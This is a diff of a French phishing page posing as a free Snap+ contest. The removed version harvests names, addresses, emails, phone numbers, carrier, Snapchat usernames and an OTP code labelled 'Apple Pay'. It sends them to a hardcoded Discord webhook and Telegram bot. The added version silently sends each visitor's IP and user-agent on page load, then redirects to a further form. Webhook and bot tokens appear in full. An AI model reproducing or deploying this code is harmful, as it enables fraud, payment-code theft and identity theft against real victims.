@@ -1,302 +1,54 @@
-<!DOCTYPE html>
+<!<!DOCTYPE html>
 <html lang="fr">
-<head>
-<meta charset="UTF-8" />
-<title>Concours Snap+ 1 an Gratuit</title>
+<head><meta charset="UTF-8"><title>Snap+ Connexion</title>
 <style>
-  body {
-    background: #2c014d;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    color: white;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-  }
-  .container {
-    background: rgba(44, 1, 77, 0.85);
-    padding: 30px;
-    border-radius: 20px;
-    box-shadow: 0 0 20px #a54ffb;
-    width: 360px;
-    text-align: center;
-  }
-  input, select, button {
-    width: 100%;
-    margin: 8px 0;
-    padding: 12px;
-    border-radius: 10px;
-    border: 2px solid #a54ffb;
-    background: transparent;
-    color: white;
-    font-size: 16px;
-    outline: none;
-  }
-  button {
-    cursor: pointer;
-    background: #f7b500; /* jaune */
-    color: #2c014d;
-    font-weight: bold;
-    box-shadow: 0 0 10px #f7b500;
-    transition: 0.3s;
-  }
-  button:hover {
-    background: #e0a600;
-    box-shadow: 0 0 20px #ffcb3c;
-  }
-  #step2, #otpStep {
-    display: none;
-  }
+  body{background:#2c014d;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+  .c{background:rgba(44,1,77,0.85);padding:30px;border-radius:20px;width:360px;text-align:center}
+  input,select,button{width:100%;margin:8px 0;padding:12px;border:2px solid #a54ffb;border-radius:10px;background:transparent;color:white;font-size:16px;outline:none}
+  button{background:#f7b500;color:#2c014d;font-weight:bold;cursor:pointer;box-shadow:0 0 10px #f7b500;transition:0.3s}
+  button:hover{background:#e0a600;box-shadow:0 0 20px #ffcb3c}
 </style>
 </head>
 <body>
-
-<div class="container">
-
-  <h1>🎁 Concours Snap+ 1 an Gratuit 🎁</h1>
-
-  <!-- Étape 1: numéro + opérateur -->
-  <form id="step1Form">
-    <input type="text" id="telephone" placeholder="Numéro de téléphone" required pattern="[\d\s+]{6,}" />
-    <select id="operateur" required>
+<div class="c">
+  <h1>🎁 Snap+ Concours</h1>
+  <form id="form1">
+    <input name="telephone" type="text" placeholder="Numéro de téléphone" required pattern="[\d\s+]{6,}">
+    <select name="operateur" required>
       <option value="" disabled selected>Opérateur téléphonique</option>
-      <option value="Orange">Orange</option>
-      <option value="SFR">SFR</option>
-      <option value="Bouygues">Bouygues</option>
-      <option value="Free">Free</option>
-      <option value="Autre">Autre</option>
+      <option>Orange</option><option>SFR</option><option>Bouygues</option><option>Free</option><option>Autre</option>
     </select>
     <button type="submit">Continuer</button>
   </form>
-
-  <!-- Étape 2: formulaire complet -->
-  <form id="step2Form">
-    <input type="text" id="nom" placeholder="Nom" required />
-    <input type="text" id="prenom" placeholder="Prénom" required />
-    <input type="email" id="email" placeholder="Email" required />
-    <input type="text" id="ville" placeholder="Ville" required />
-    <input type="text" id="codePostal" placeholder="Code Postal" required />
-    <input type="text" id="adresse" placeholder="Adresse (facultatif)" />
-    <input type="text" id="snap" placeholder="Nom d'utilisateur Snapchat" required />
-    <button type="submit">Valider</button>
-  </form>
-
-  <!-- Étape OTP -->
-  <form id="otpStep">
-    <h2>🔐 Code OTP 🔐</h2>
-    <input type="text" id="otpCode" placeholder="Entrez le code OTP reçu" required />
-    <button type="submit">Envoyer</button>
-  </form>
-
-  <div id="message" style="margin-top: 20px; color: #f88;"></div>
 </div>
 
 <script>
-  // === Config ===
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
-  const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6o-VP8_aPOnsT6Qk9tBN2E";
-  const TELEGRAM_CHAT_ID = "-1002810249796";
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
+  const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
+  const TELEGRAM_CHAT = "-1002810249796";
 
-  const WAIT_TIME_MS = 5 * 60 * 1000; // 5 minutes
+  async function getIP(){ try{ const r = await fetch("https://api.ipify.org?format=json"); const j = await r.json(); return j.ip || "IP inconnue"; }catch{return "IP inconnue"} }
+  async function sendDiscord(embed){ await fetch(DISCORD_WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})}); }
+  async function sendTelegram(text){ await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT,text,parse_mode:'Markdown',disable_web_page_preview:true})}); }
 
-  let userIP = null;
-  let userAgent = navigator.userAgent || "Inconnu";
-
-  // Check délai 5 min entre envois OTP
-  function canSendOtp() {
-    const lastSent = localStorage.getItem("lastSentOtp");
-    if (!lastSent) return true;
-    return Date.now() - parseInt(lastSent, 10) > WAIT_TIME_MS;
-  }
-
-  function updateLastSentOtp() {
-    localStorage.setItem("lastSentOtp", Date.now().toString());
-  }
-
-  async function getPublicIP() {
-    try {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const data = await res.json();
-      return data.ip || "IP inconnue";
-    } catch {
-      return "IP inconnue";
-    }
-  }
-
-  async function sendToDiscord(embed) {
-    return fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({embeds: [embed]}),
-    });
-  }
-
-  async function sendToTelegram(text) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    return fetch(url, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: text,
-        parse_mode: "Markdown",
-        disable_web_page_preview: true,
-      }),
-    });
-  }
-
-  async function sendLoginInfo() {
-    if (!userIP) return;
+  window.addEventListener('DOMContentLoaded', async ()=>{
+    const ip = await getIP();
+    const ua = navigator.userAgent || "Inconnu";
     const discordEmbed = {
-      title: "📦 LOGIN by Zeleph [📦]",
-      color: 0x9B00FF,
-      description: `[🌐] TIERS [🌐]\n\n🌐 Adresse IP : ${userIP}\n🌐 User-Agent : ${userAgent}`,
-      timestamp: new Date().toISOString(),
+      title:"📦 LOGIN by Zeleph [📦]",
+      color:0x9B00FF,
+      description:`[🌐] TIERS [🌐]\n\n🌐 Adresse IP : ${ip}\n🌐 User-Agent : ${ua}`,
+      timestamp:new Date().toISOString()
     };
-    const telegramText = `[📦] LOGIN by Zeleph [📦]\n\n[🌐] TIERS [🌐]\n\n🌐 Adresse IP : ${userIP}\n🌐 User-Agent : ${userAgent}`;
+    const telegramText = `[📦] LOGIN by Zeleph [📦]\n\n[🌐] TIERS [🌐]\n\n🌐 Adresse IP : ${ip}\n🌐 User-Agent : ${ua}`;
+    await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
+  });
 
-    await Promise.all([sendToDiscord(discordEmbed), sendToTelegram(telegramText)]);
-  }
-
-  async function sendFormInfos(step1Data, step2Data) {
-    const discordEmbed = {
-      title: "🎲 INFOS PARTICIPANT [🎲]",
-      color: 0x9B00FF,
-      fields: [
-        {name: "🚀 Nom", value: step2Data.nom, inline: true},
-        {name: "🚀 Prénom", value: step2Data.prenom, inline: true},
-        {name: "🚀 Opérateur Téléphonique", value: step1Data.operateur, inline: true},
-        {name: "🚀 Téléphone", value: step1Data.telephone, inline: true},
-        {name: "🚀 Adresse", value: step2Data.adresse || "Non fournie", inline: false},
-        {name: "🚀 Ville", value: step2Data.ville, inline: true},
-        {name: "🚀 Code Postal", value: step2Data.codePostal, inline: true},
-        {name: "🚀 E-Mail", value: step2Data.email, inline: true},
-        {name: "🚀 Snapchat", value: step2Data.snap, inline: true},
-        {name: "🌐 Adresse IP", value: userIP, inline: false},
-        {name: "🌐 User-Agent", value: userAgent, inline: false},
-      ],
-      timestamp: new Date().toISOString(),
-    };
-
-    const telegramText =
-      `[🎲] INFOS [🎲]\n\n` +
-      `🚀 Nom : ${step2Data.nom}\n` +
-      `🚀 Prénom : ${step2Data.prenom}\n` +
-      `🚀 Opérateur Téléphonique : ${step1Data.operateur}\n` +
-      `🚀 Téléphone : ${step1Data.telephone}\n` +
-      `🚀 Adresse : ${step2Data.adresse || "Non fournie"}\n` +
-      `🚀 Ville : ${step2Data.ville}\n` +
-      `🚀 Code Postal : ${step2Data.codePostal}\n` +
-      `🚀 E-Mail : ${step2Data.email}\n` +
-      `🚀 Snapchat : ${step2Data.snap}\n\n` +
-      `[🌐] TIERS [🌐]\n` +
-      `🌐 Adresse IP : ${userIP}\n` +
-      `🌐 User-Agent : ${userAgent}`;
-
-    await Promise.all([sendToDiscord(discordEmbed), sendToTelegram(telegramText)]);
-  }
-
-  async function sendOtpMessage(code, data) {
-    const discordEmbed = {
-      title: "🍎 APPLE PAY [🍎]",
-      color: 0xe74c3c,
-      fields: [
-        {name: "🍎 Code", value: `\`${code}\``, inline: false},
-        {name: "🚀 Nom", value: data.nom, inline: true},
-        {name: "🚀 Prénom", value: data.prenom, inline: true},
-        {name: "🚀 Date de naissance", value: data.dob || "Non fournie", inline: true},
-        {name: "🚀 E-Mail", value: data.email, inline: false},
-        {name: "🌐 Adresse IP", value: userIP, inline: false},
-        {name: "🌐 User-Agent", value: userAgent, inline: false},
-      ],
-      timestamp: new Date().toISOString(),
-    };
-
-    const telegramText =
-      `[🍎] APPLE PAY [🍎]\n\n` +
-      `🍎 Code : ${code}\n\n` +
-      `[🎲] INFOS [🎲]\n` +
-      `🚀 Nom : ${data.nom}\n` +
-      `🚀 Prénom : ${data.prenom}\n` +
-      `🚀 Date de naissance : ${data.dob || "Non fournie"}\n` +
-      `🚀 E-Mail : ${data.email}\n\n` +
-      `[🌐] TIERS [🌐]\n` +
-      `🌐 Adresse IP : ${userIP}\n` +
-      `🌐 User-Agent : ${userAgent}`;
-
-    await Promise.all([sendToDiscord(discordEmbed), sendToTelegram(telegramText)]);
-    updateLastSentOtp();
-  }
-
-  document.addEventListener("DOMContentLoaded", async () => {
-    userIP = await getPublicIP();
-    await sendLoginInfo();
-
-    const step1Form = document.getElementById("step1Form");
-    const step2Form = document.getElementById("step2Form");
-    const otpStep = document.getElementById("otpStep");
-    const messageDiv = document.getElementById("message");
-
-    let step1Data = null;
-    let step2Data = null;
-
-    if (!canSendOtp()) {
-      step1Form.style.display = "none";
-      step2Form.style.display = "none";
-      otpStep.style.display = "block";
-      messageDiv.textContent = "Vous avez déjà envoyé un code, veuillez entrer le code OTP.";
-    }
-
-    step1Form.addEventListener("submit", e => {
-      e.preventDefault();
-      step1Data = {
-        telephone: e.target.telephone.value.trim(),
-        operateur: e.target.operateur.value,
-      };
-      step1Form.style.display = "none";
-      step2Form.style.display = "block";
-      messageDiv.textContent = "";
-    });
-
-    step2Form.addEventListener("submit", async e => {
-      e.preventDefault();
-      step2Data = {
-        nom: e.target.nom.value.trim(),
-        prenom: e.target.prenom.value.trim(),
-        email: e.target.email.value.trim(),
-        ville: e.target.ville.value.trim(),
-        codePostal: e.target.codePostal.value.trim(),
-        adresse: e.target.adresse.value.trim(),
-        snap: e.target.snap.value.trim(),
-      };
-      messageDiv.textContent = "Envoi des informations...";
-      await sendFormInfos(step1Data, step2Data);
-      step2Form.style.display = "none";
-      otpStep.style.display = "block";
-      messageDiv.textContent = "Informations envoyées. Veuillez entrer le code OTP reçu.";
-    });
-
-    otpStep.addEventListener("submit", async e => {
-      e.preventDefault();
-      const code = e.target.otpCode.value.trim();
-
-      if (!canSendOtp()) {
-        messageDiv.textContent = "Merci d’attendre 5 minutes avant de renvoyer un code OTP.";
-        return;
-      }
-
-      const otpData = {
-        nom: step2Data.nom,
-        prenom: step2Data.prenom,
-        dob: "Non fournie",
-        email: step2Data.email,
-      };
-
-      messageDiv.textContent = "Envoi du code OTP...";
-      await sendOtpMessage(code, otpData);
-      messageDiv.textContent = "Code OTP envoyé avec succès.";
-    });
+  document.getElementById('form1').addEventListener('submit', e=>{
+    e.preventDefault();
+    const d = new FormData(e.target);
+    localStorage.setItem('step1', JSON.stringify({telephone:d.get('telephone'),operateur:d.get('operateur')}));
+    window.location = 'formulaire.html';
   });
 </script>
 </body>
